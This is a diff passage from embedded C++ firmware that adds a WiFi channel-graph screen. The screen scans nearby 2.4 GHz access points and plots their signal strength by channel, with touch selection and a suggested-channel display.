+  if (!bssid) return -1;
+  for (int i = 0; i < s_count; i++) {
+    if (memcmp(s_nets[i].bssid, bssid, 6) == 0) return i;
+  }
+  return -1;
+}
+
+static void populateFromScan(int n) {
+  s_count = min(n, MAX_NETS);
+  for (int i = 0; i < s_count; i++) {
+    CgNet& e = s_nets[i];
+    String ssid = WiFi.SSID(i);
+    strncpy(e.ssid, ssid.c_str(), sizeof(e.ssid) - 1);
+    e.ssid[sizeof(e.ssid) - 1] = '\0';
+    const uint8_t* b = WiFi.BSSID(i);
+    if (b) {
+      memcpy(e.bssid, b, 6);
+    } else {
+      memset(e.bssid, 0, 6);
+    }
+    e.rssi = (int8_t)constrain(WiFi.RSSI(i), -127, 0);
+    e.channel = (uint8_t)constrain((int)WiFi.channel(i), 1, 13);
+    e.authmode = WiFi.encryptionType(i);
+    e.colorIdx = colorIndexForBssid(e.bssid);
+  }
+  s_needRedraw = true;
+}
+
+static void abortAsyncScanIfAny() {
+  if (s_asyncScanActive) {
+    (void)esp_wifi_scan_stop();
+    WiFi.scanDelete();
+    s_asyncScanActive = false;
+  }
+  s_scanning = false;
+}
+
+// Starts a background (async) scan and returns immediately — the UI keeps
+// drawing a "scanning..." indicator while pollScan() checks for completion
+// on every loop() tick instead of blocking here.
+static void startScan() {
+  pauseBackgroundRadioTasks();
+  if (WifiScan::bgScanRunning) {
+    WifiScan::stopBgWifiScanIfRunning();
+  }
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  WiFi.scanDelete();
+  delay(20);
+  const uint32_t dwell = wifiStaScanMsPerChannel();
+  const int ret = WiFi.scanNetworks(true, true, false, dwell);
+  s_scanning = true;
+  s_scanAnimFrame = 0;
+  s_lastScanAnimMs = millis();
+  s_asyncScanActive = (ret == WIFI_SCAN_RUNNING);
+  if (!s_asyncScanActive) {
+    // Driver returned instantly (cached result) — consume it right away.
+    if (ret >= 0) {
+      populateFromScan(ret);
+    }
+    s_scanning = false;
+  }
+  s_lastAutoScanMs = millis();
+}
+
+static void pollScan() {
+  if (!s_scanning || !s_asyncScanActive) return;
+  const int n = WiFi.scanComplete();
+  if (n == WIFI_SCAN_RUNNING) return;
+  s_asyncScanActive = false;
+  s_scanning = false;
+  if (n >= 0) {
+    populateFromScan(n);
+  }
+  // WIFI_SCAN_FAILED: keep showing the last good results.
+}
+
+static void drawChannelMarkers() {
+  static const int kMarked[3] = {1, 6, 11};
+  const int top = graphTop();
+  const int bot = graphBottom();
+  for (int m = 0; m < 3; m++) {
+    const int x = (int)xForCh((float)kMarked[m]);
+    // TFT_eSPI has no native dashed line — draw it as short segments.
+    for (int y = top; y < bot; y += 6) {
+      tft.drawFastVLine(x, y, 3, TFT_CYAN);
+    }
+  }
+}
+
+static void drawAxes() {
+  const int top = graphTop();
+  const int bot = graphBottom();
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+  tft.setTextColor(UI_LINE, TFT_BLACK);
+  for (int dbm = RSSI_TOP_DBM; dbm >= RSSI_BOT_DBM; dbm -= 10) {
+    const int y = yForRssi(dbm);
+    tft.drawFastHLine(GRAPH_X_LEFT, y, GRAPH_X_RIGHT - GRAPH_X_LEFT, UI_LINE);
+    tft.setCursor(0, y - 3);
+    tft.print(dbm);
+  }
+  tft.drawFastVLine(GRAPH_X_LEFT, top, bot - top, UI_LINE);
+
+  const int chLabelY = channelLabelY();
+  for (int ch = 1; ch <= 13; ch++) {
+    const int x = (int)xForCh((float)ch);
+    const bool highlight = (ch == 1 || ch == 6 || ch == 11);
+    tft.setTextColor(highlight ? TFT_CYAN : UI_LINE, TFT_BLACK);
+    tft.setCursor(x - (ch >= 10 ? 5 : 3), chLabelY);
+    tft.print(ch);
+  }
+  drawChannelMarkers();
+}
+
+// Visualization-only convention: a ~20MHz-wide Gaussian lobe centered on the
+// reported channel. The scan only gives us the center channel and RSSI — the
+// ESP never measures the real occupied spectrum, so this width is just a
+// readable stand-in for "roughly how wide a 2.4GHz channel is", not a
+// measurement.
+static constexpr float kSigmaChannels = 1.25f;
+
+static int curveYAtX(int netIdx, int x) {
+  const CgNet& e = s_nets[netIdx];
+  const float yPeak = (float)yForRssi(e.rssi);
+  const float chx = chAtX(x);
+  const float d = chx - (float)e.channel;
+  const float sigmaPx = kSigmaChannels;
+  const float v = expf(-(d * d) / (2.0f * sigmaPx * sigmaPx));
+  const float yBot = (float)graphBottom();
+  return (int)lroundf(yBot - (yBot - yPeak) * v);
+}
+
+struct LabelBox { int16_t x, y, w, h; };
+static LabelBox s_labelBoxes[MAX_NETS];
+static int s_labelBoxCount = 0;
+
+static bool boxesOverlap(const LabelBox& a, const LabelBox& b) {
+  return !(a.x + a.w < b.x || b.x + b.w < a.x || a.y + a.h < b.y || b.y + b.h < a.y);
+}
+
+static void drawNetworkLabel(int netIdx, int peakX, int peakY, uint16_t color) {
+  const CgNet& e = s_nets[netIdx];
+  char label[20];
+  if (e.ssid[0] == '\0') {
+    snprintf(label, sizeof(label), "(hidden) %d", e.channel);
+  } else {
+    char ssidTrunc[11];
+    strncpy(ssidTrunc, e.ssid, 10);
+    ssidTrunc[10] = '\0';
+    snprintf(label, sizeof(label), "%s %d", ssidTrunc, e.channel);
+  }
+
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+  const int16_t w = (int16_t)tft.textWidth(label);
+  const int16_t h = 9;
+  int16_t x = (int16_t)constrain(peakX - w / 2, GRAPH_X_LEFT, GRAPH_X_RIGHT - w);
+  int16_t y = (int16_t)(peakY - 10);
+
+  // Anti-collision: stack the label higher until it clears every label
+  // already placed this frame (clamped so it never leaves the graph area).
+  LabelBox box = {x, y, w, h};
+  bool moved = true;
+  int guard = 0;
+  while (moved && guard++ < 20) {
+    moved = false;
+    for (int i = 0; i < s_labelBoxCount; i++) {
+      if (boxesOverlap(box, s_labelBoxes[i])) {
+        box.y -= (h + 1);
+        moved = true;
+      }
+    }
+  }
+  if (box.y < graphTop()) {
+    box.y = graphTop();
+  }
+  if (s_labelBoxCount < MAX_NETS) {
+    s_labelBoxes[s_labelBoxCount++] = box;
+  }
+
+  tft.setTextColor(color, TFT_BLACK);
+  tft.setCursor(box.x, box.y);
+  tft.print(label);
+}
+
+static void drawYouAreHereMarker(int netIdx) {
+  const int x = (int)xForCh((float)s_nets[netIdx].channel);
+  const int y = yForRssi(s_nets[netIdx].rssi);
+  tft.fillTriangle(x - 4, y - 8, x + 4, y - 8, x, y - 2, TFT_WHITE);
+}
+
+static void drawNetworkCurve(int netIdx, bool selected, bool dimmed) {
+  const CgNet& e = s_nets[netIdx];
+  uint16_t color = kPalette[e.colorIdx];
+  if (dimmed) {
+    // Cheap "dim" without alpha blending: halve each channel's bits.
+    color = (uint16_t)(((color >> 1) & 0x7BEF));
+  }
+
+  int prevY = curveYAtX(netIdx, GRAPH_X_LEFT);
+  for (int x = GRAPH_X_LEFT + 1; x <= GRAPH_X_RIGHT; x++) {
+    const int y = curveYAtX(netIdx, x);
+    tft.drawLine(x - 1, prevY, x, y, color);
+    if (selected) {
+      // Slightly thicker outline for the selected curve.
+      tft.drawLine(x - 1, prevY + 1, x, y + 1, color);
+    }
+    prevY = y;
+  }
+
+  const int peakX = (int)xForCh((float)e.channel);
+  const int peakY = yForRssi(e.rssi);
+  drawNetworkLabel(netIdx, peakX, peakY, color);
+}
+
+static void drawDetailStrip() {
+  const int y = detailStripY();
+  tft.fillRect(0, y, SCREEN_WIDTH, DETAIL_STRIP_H, TFT_BLACK);
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+  tft.setCursor(4, y + 4);
+
+  const int sel = findSelectedIndex();
+  if (sel < 0) {
+    tft.setTextColor(GREEN, TFT_BLACK);
+    char buf[32];
+    snprintf(buf, sizeof(buf), "Suggested: ch %d", suggestedChannel());
+    tft.print(buf);
+    return;
+  }
+
+  const CgNet& e = s_nets[sel];
+  char buf[64];
+  const char* ssid = (e.ssid[0] == '\0') ? "(hidden)" : e.ssid;
+  snprintf(buf, sizeof(buf), "%s  ch%d  %ddBm  %s", ssid, e.channel, e.rssi, authShort(e.authmode));
+  tft.setTextColor(ORANGE, TFT_BLACK);
+  tft.print(buf);
+}
+
+static void drawHeaderRow() {
+  tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, UI_FG);
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+  tft.setTextColor(UI_TEXT, UI_FG);
+  tft.setCursor(4, STATUS_BAR_Y_OFFSET + 4);
+  char buf[28];
+  snprintf(buf, sizeof(buf), "Channel Graph  %d APs", s_count);
+  tft.print(buf);
+
+  tft.setTextColor(UI_ACCENT, UI_FG);
+  const char* tag = "2.4G";
+  const int w = tft.textWidth(tag);
+  tft.setCursor(SCREEN_WIDTH - w - 4, STATUS_BAR_Y_OFFSET + 4);
+  tft.print(tag);
+
+  tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
+}
+
+static void drawScanningIndicator() {
+  const unsigned long now = millis();
+  if (now - s_lastScanAnimMs > 300) {
+    s_scanAnimFrame = (s_scanAnimFrame + 1) % 4;
+    s_lastScanAnimMs = now;
+
+    char dots[8] = "";
+    for (int i = 0; i < s_scanAnimFrame; i++) {
+      dots[i] = '.';
+    }
+    dots[s_scanAnimFrame] = '\0';
+
+    tft.fillRect(0, STATUS_BAR_Y_OFFSET, 140, STATUS_BAR_HEIGHT, UI_FG);
+    tft.setTextFont(1);
+    tft.setTextSize(1);
+    tft.setTextColor(UI_WARN, UI_FG);
+    tft.setCursor(4, STATUS_BAR_Y_OFFSET + 4);
+    char buf[24];
+    snprintf(buf, sizeof(buf), "Scanning%s", dots);
+    tft.print(buf);
+  }
+}
+
+static void drawGraph() {
+  wifiClearBody(TFT_BLACK);
+  drawAxes();
+
+  if (s_count == 0) {
+    tft.setTextFont(1);
+    tft.setTextColor(UI_TEXT, TFT_BLACK);
+    tft.setCursor(GRAPH_X_LEFT + 10, (graphTop() + graphBottom()) / 2);
+    tft.print("No networks found.");
+    drawDetailStrip();
+    return;
+  }
+
+  // Draw order: weakest signal first, strongest on top (most readable).
+  static int order[MAX_NETS];
+  for (int i = 0; i < s_count; i++) order[i] = i;
+  for (int i = 1; i < s_count; i++) {
+    const int key = order[i];
+    int j = i - 1;
+    while (j >= 0 && s_nets[order[j]].rssi > s_nets[key].rssi) {
+      order[j + 1] = order[j];
+      j--;
+    }
+    order[j + 1] = key;
+  }
+
+  s_labelBoxCount = 0;
+  const int sel = findSelectedIndex();
+  for (int k = 0; k < s_count; k++) {
+    const int idx = order[k];
+    const bool selected = (idx == sel);
+    const bool dimmed = s_hasSelection && !selected;
+    drawNetworkCurve(idx, selected, dimmed);
+  }
+
+  const int connected = findConnectedIndex();
+  if (connected >= 0) {
+    drawYouAreHereMarker(connected);
+  }
+
+  drawDetailStrip();
+}
+
+static void handleTouchSelect(int tx, int ty) {
+  if (ty < graphTop() || ty > graphBottom() || tx < GRAPH_X_LEFT || tx > GRAPH_X_RIGHT) {
+    return;
+  }
+  int best = -1;
+  int bestDist = 1000000;
+  for (int i = 0; i < s_count; i++) {
+    const int cy = curveYAtX(i, tx);
+    const int d = abs(cy - ty);
+    if (d < bestDist) {
+      bestDist = d;
+      best = i;
+    }
+  }
+  static constexpr int kTapToleranceY = 14;
+  if (best >= 0 && bestDist <= kTapToleranceY) {
+    s_hasSelection = true;
+    memcpy(s_selectedBssid, s_nets[best].bssid, 6);
+  } else {
+    s_hasSelection = false;
+  }
+  s_needRedraw = true;
+}
+
+static void handleTouch() {
+  static unsigned long lastTouchMs = 0;
+  const unsigned long now = millis();
+  if (now - lastTouchMs < 120) return;
+
+  int x, y;
+  if (!feature_active || !readTouchXY(x, y)) return;
+  // Stay out of the shared status bar and the touch nav bar at the bottom —
+  // those have their own hit-testing (redrawTouchButtonBar/maintainTouchNavBar).
+  if (y < kWifiBodyTop || y > detailStripY() + DETAIL_STRIP_H) return;
+
+  lastTouchMs = now;
+  if (y <= graphBottom()) {
+    handleTouchSelect(x, y);
+  } else {
+    // Tap on the detail strip (not over a curve): clear selection.
+    s_hasSelection = false;
+    s_needRedraw = true;
+  }
+}
+
+// Button layout for this feature: UP/DOWN/RIGHT are unused, LEFT exits back
+// to the WiFi submenu, and SELECT (center) triggers a manual rescan.
+static void updateNavLabels() {
+  if (!featureHasTouchNavBar()) {
+    return;
+  }
+  setTouchNavLabels("Back", nullptr, "Rescan", nullptr, nullptr);
+  redrawTouchButtonBar();
+}
+
+static void drawTabBarFallback() {
+  if (featureHasTouchNavBar()) {
+    return;
+  }
+  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
+  FeatureUI::drawButtonRect(0, 304, 70, 16, "Back", FeatureUI::ButtonStyle::Secondary, false, false);
+  FeatureUI::drawButtonRect(170, 304, 70, 16, "Rescan", FeatureUI::ButtonStyle::Secondary, false, false);
+}
+
+static void handleTabBarFallbackTouch() {
+  if (featureHasTouchNavBar()) return;
+  int x, y;
+  if (!feature_active || !readTouchXY(x, y)) return;
+  if (y < 300) return;
+  if (x <= 70) {
+    feature_exit_requested = true;
+  } else if (x >= 170) {
+    startScan();
+    s_needRedraw = true;
+  }
+  delay(120);
+}
+
+void channelGraphSetup() {
+  pauseBackgroundRadioTasks();
+  setTouchButtonInputEnabled(true);
+  featureClearContent(TFT_BLACK);
+
+  s_count = 0;
+  s_hasSelection = false;
+  s_scanning = false;
+  s_asyncScanActive = false;
+  s_uiDrawn = false;
+  s_needRedraw = true;
+
+  float currentBatteryVoltage = readBatteryVoltage();
+  drawStatusBar(currentBatteryVoltage, true, true);
+  drawHeaderRow();
+  updateNavLabels();
+  drawTabBarFallback();
+
+  startScan();
+}
+
+void channelGraphLoop() {
+  // Deliberately not featureExitButtonPressed() (that's hardwired to
+  // BTN_SELECT) — here LEFT exits and SELECT is Rescan instead.
+  if (feature_active && isButtonPressed(BTN_LEFT)) {
+    abortAsyncScanIfAny();
+    feature_exit_requested = true;
+    return;
+  }
+
+  updateStatusBar();
+  maintainTouchNavBar();
+
+  if (isButtonPressedEdge(BTN_SELECT) && !s_scanning) {
+    startScan();
+  }
+
+  pollScan();
+  handleTouch();
+  handleTabBarFallbackTouch();
+
+  // Passive auto-rescan so the graph stays live without the user tapping
+  // Rescan every time (mirrors the WiFi Scanner's own background refresh).
+  if (!s_scanning && (millis() - s_lastAutoScanMs > AUTO_RESCAN_MS)) {
+    startScan();
+  }
+
+  if (s_scanning) {
+    drawScanningIndicator();
+  } else if (s_needRedraw) {
+    drawHeaderRow();
+    drawGraph();
+    s_needRedraw = false;
+  }
+}
+
+}  // namespace ChannelGraph
 
 
 namespace FirmwareUpdate {
